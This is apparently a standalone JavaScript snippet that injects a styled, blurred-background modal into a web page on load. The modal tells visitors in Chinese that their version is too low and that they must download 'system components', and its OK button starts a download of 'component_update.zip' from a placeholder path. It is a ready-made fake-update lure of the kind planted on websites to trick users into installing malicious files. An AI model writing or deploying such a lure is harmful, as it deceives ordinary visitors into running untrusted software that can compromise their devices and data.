// 动态添加样式
const style = document.createElement('style');

style.textContent = `
    .myModal {
        display: none;
        position: fixed;
        z-index: 1000;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        overflow: auto;
        background-color: rgba(0, 0, 0, 0.6);
        justify-content: center;
        align-items: center;
        backdrop-filter: blur(5px); /* 背景虚化效果 */
        -webkit-backdrop-filter: blur(5px); /* 背景虚化效果 */
        animation: fadeIn 0.5s;
        display: flex;
    }

    .modal-content {
        background-color: #fff;
        margin: auto;
        padding: 30px 20px;
        border: none;
        border-radius: 10px;
        width: 80%;
        max-width: 500px;
        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        animation: slideIn 0.5s;
        text-align: center;
        font-family: Arial, sans-serif;
        font-size: 16px;
    }

    .modal-content p {
        margin: 1em 0;
    }

    .close {
        color: #aaa;
        float: right;
        font-size: 28px;
        font-weight: bold;
        cursor: pointer;
    }

    .close:hover,
    .close:focus {
        color: #000;
        text-decoration: none;
    }

    .button {
        color: white;
        padding: 12px 24px;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        transition: background-color 0.3s ease;
        margin-top: 20px;
        font-size: 16px;
    }

    .update-button {
        background-color: #28a745;
    }

    .update-button:hover {
        background-color: #218838;
    }

    @keyframes fadeIn {
        from {opacity: 0;}
        to {opacity: 1;}
    }

    @keyframes slideIn {
        from {transform: translateY(-50px);}
        to {transform: translateY(0);}
    }
`;

document.head.append(style);

// 创建模态框的HTML结构
const modalHTML = `
    <div id="myModal" class="myModal">
        <div class="modal-content">
            <span class="close">&times;</span>
            <p><strong>【您当前版本过低】</strong></p>
            <p>提示：为了确保平台的正常访问，请下载并安装最新的系统组件。点击“确定”开始下载。</p>
            <button id="updateBtn" class="button update-button">确定</button>
        </div>
    </div>
`;

document.body.insertAdjacentHTML('beforeend', modalHTML);
const modal = document.getElementById("myModal");
const span = document.getElementsByClassName("close")[0];

window.onload = function() {
    modal.style.display = "flex";
}

span.onclick = function() {
    modal.style.display = "none";
}

const updateBtn = document.getElementById("updateBtn");
const cancelBtn = document.getElementById("cancelBtn");

updateBtn.onclick = function() {
    const link = document.createElement('a');
    link.href = 'path_to_your_file';
    link.download = 'component_update.zip'; 
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    modal.style.display = "none";
}

window.onclick = function(event) {
    if (event.target == modal) {
        modal.style.display = "none";
        
    }
}
